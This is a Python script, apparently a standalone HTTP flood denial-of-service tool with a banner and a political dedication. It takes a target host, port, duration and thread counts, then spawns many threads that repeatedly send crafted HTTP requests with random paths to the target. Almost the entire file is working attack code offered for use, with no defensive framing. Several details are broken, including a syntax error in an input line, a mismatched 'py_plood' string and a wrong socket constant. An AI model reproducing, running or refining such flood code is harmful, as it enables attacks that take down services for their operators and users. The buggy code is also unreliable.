#!/usr/bin/env python3.12
# _*_ coding: utf-8 _*_
# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . .")
    exit()

# DEF & CLASS

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def status_print(ip,port,thread_id,rps,path_get):
    print(f"\r{Fore.YELLOW}FLOODING{Fore.LIGHTWHITE_EX}HTTP {Fore.WHITE}=> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.YELLOW}PATH{Fore.WHITE}={path_get} {Fore.CYAN}id{Fore.WHITE}={thread_id}{Fore.RESET}") 
    print(f"\r{Fore.BLUE}FLOODING{Fore.YELLOW}HTTP {Fore.WHITE}=> {Fore.YELLOW}TARGET{Fore.BLUE}={ip}:{port} {Fore.GREEN}PATH{Fore.WHITE}={path_get}{Fore.CYAN}rps{Fore.RED}={rps} {Fore.RESET}") 
def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data
    
def generate_url_path_choice(num):
    letter = f"{Fore.BLACK}'''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
    rps = 0
    url_path = ''
    path_get = ['py_plood','choices_flood']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "py_flood":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
            rps += 2
    except:
        try:
            s.shutdown(socket.shut_rdwr)
            s.close()
        except:
            pass
    status_print(ip,port,id,rps,path_get_loader)

status_code = False
id_loader = 0
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent):
    global status_code,id_loader
    if status_code == True:
        while time.time() < time_loader:
            for _ in range(spam_loader):
                id_loader += 1
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
#DATA
banner = f"""
{Fore.LIGHTWHITE_EX}   ┌───╮                   ╭╮
{Fore.LIGHTWHITE_EX}   └────╮╭───╮ ┌───╮ ╭───╮ ││  ╭╮  ╭────╮╭╮   ╭╮╭╮╭──╮ ╭╮   ╭╮╭╮
{Fore.LIGHTWHITE_EX}       │││╭───╮└────╮╰────╮││ ╭╯|  │╭───╯││   │││╰╯╭──╮││   ││││
{Fore.LIGHTWHITE_EX}       │││╰──╯│    ││╭───╯││╰─╯╭╯  │╰───╮││   │││╭─╯ ││││   ││││
{Fore.LIGHTWHITE_EX}  ╭╮   │││┌───╯    │││╭──╮││╭─╮╰╮  ╰───╮|││   ││││   │││╰───╯│││
{Fore.LIGHTWHITE_EX}  |╰────╯|╰──╮╭╮   ││╰───╯|││ ╰╮|  ╭────╯│╰────╯││   ││╰────╮│││
{Fore.LIGHTWHITE_EX}  ╰────╯ ╰───╯|╰────╯ ╰───╯╰╯  ╰╯  ╰───╯ ╰────╯ ╰╯   ╰╯╭─────╯╰╯
{Fore.LIGHTWHITE_EX}              ╰────╯                                   ╰────╯
{Fore.RESET}"""

print(banner)
host = ""
ip = ""
print(f"{Fore.CYAN}╭{'─' * 64}╮")
print(f"{Fore.CYAN}│{' ' * 4}{Fore.YELLOW}DEDICATION TO THE STRUGLLE OF THE PALISTINIAN POEPLE{' ' * 8}{Fore.CYAN}|")
print(f"{Fore.CYAN}│{' ' * 64}│")
target_loader = input(f"{Fore.CYAN}╰─> IP/URL:{Fore.BLUE} "))
port_loader = int(input(f"{Fore.CYAN}╰─> PORT:{Fore.BLUE} "))
time_loader = time.time() + int(input(f"{Fore.CYAN}╰─> TIME(DF250):{Fore.BLUE} "))
spam_loader = int(input(f"{Fore.CYAN}╰─> SP THREAD(DF50/250):{Fore.BLUE} "))
create_thread = int(input(F"{Fore.CYAN}╰─> CR THREAD (DF=50):{Fore.BLUE} "))
booter_sent = int(input(F"{Fore.CYAN}╰─> BOOTER SENT (DF500):{Fore.BLUE} "))
print(f"{Fore.CYAN}       EXAMPLE HTTP METHODS> CONNECT GET POST {Fore.BLACK}PUT PATCH HEAD DELETE OPTIONS TRACE")
print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> {Fore.BLACK}PANOS MIRAI EXPLOIT LOGSHELL SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
methods_loader = input(F"{Fore.CYAN}╰─>HTTP_METHODS:{Fore.BLUE} ")
print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
try:
    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    exit()
for loader_num in range(create_thread):
    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
    sys.stdout.flush()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
clear_text()
print(banner)
status_code = True
print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
